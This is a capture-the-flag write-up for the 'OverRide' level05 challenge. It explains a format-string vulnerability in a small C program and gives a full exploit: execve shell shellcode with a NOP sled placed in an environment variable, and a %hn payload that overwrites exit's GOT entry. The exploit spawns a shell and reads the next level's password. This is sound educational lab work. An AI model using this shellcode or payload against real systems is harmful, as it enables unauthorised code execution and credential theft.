# Level 05

<h3>source.c</h3>

```console
int main(void) {
  char str[100];       // esp+0x28
  int  index;             // esp+0x8c

  fgets(str, 100, stdin);
  index = 0;
  while (index < strlen(str)) {
    if ('@' < str[index] && str[index] < 'Z') {
      str[index] = tolower(str[index]);
    }
    index += 1;
  };
  printf(str);
  exit(0);
}
```

<h3>Analysis</h3>

The main functionally of this program is to transform all the input into lower case, and at the end it will show the output via `printf()`

This `printf()` is not protected so we could use `Format string` to exploit

As there is no `system()` available, we can use `ShellCode` to spawn a shell

Our target this time will be to use the exploit of `printf()` to overwrite the `GOT` of the `exit()` so it will be directing the program to run our `ShellCode`

<h3>Exploit</h3>

First, we need to find out which `printf()` arg we can take control of

```console
level05@OverRide:~$ ./level05
aaaa 1[%p] 2[%p] 3[%p] 4[%p] 5[%p] 6[%p] 7[%p] 8[%p] 9[%p] 10[%p] 11[%p] 12[%p]
aaaa 1[0x64] 2[0xf7fcfac0] 3[0xf7ec3af9] 4[0xffffd6af] 5[0xffffd6ae] 6[(nil)] 7[0xffffffff] 8[0xffffd734] 9[0xf7fdb000] 10[0x61616161] 11[0x255b3120] 12[0x32205d70]
```

Great, we found that the start of the `char* str` is at the 10th arg

Next we need to find the `GOT` of the `exit()`

```console
(gdb) p exit
$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:	push   0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

The `GOT` will be `0x80497e0` 

Now we need to put our shell code into the `ENV` and find the address 

```console
export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
```

```console
Breakpoint 1, 0x08048444 in main ()
(gdb) x/s *((char **)environ)
0xffffd822:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
(gdb) x/32wx 0xffffd822
0xffffd822:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd832:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd842:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd852:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd862:	0x90909090	0x90909090	0x90909090	0x90909090
```

From there we can choose any address that contain the `\x90`, and the `NOP slide` will bring us to the beginning of our `ShellCode`, example `0xffffd832`

To conclude these will all be the important information that we need

```console
printf() arg        = 10th
exit() GOT          = 0x80497e0 -> \xe0\x97\x04\x08
shellcode address   = 0xffffd832 -> 4294957106
```
Since `4294957106` is too big for `printf()`, we can split it into `2 bytes` with the `%hn` modifier, which means write short into the pointed address

So we need to write into `0x80497e0` and `0x80497e0 + 2` or `0x80497e2`

Now we need to split 0xffffd832 into 2, with little endian way

```console
d832 = 55346 - 8(the total count of the 1st address) = 55338
ffff = 65535 - 55346 = 10189
```

Now its time to build our payload and test our exploit

(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55338d' + '%10\$hn' + '%10189d' + '%11\$hn'"; cat - ) | ./level05

```console
level05@OverRide:~$ (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55338d' + '%10\$hn' + '%10189d' + '%11\$hn'"; cat - ) | ./level05
                                             -134415680
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```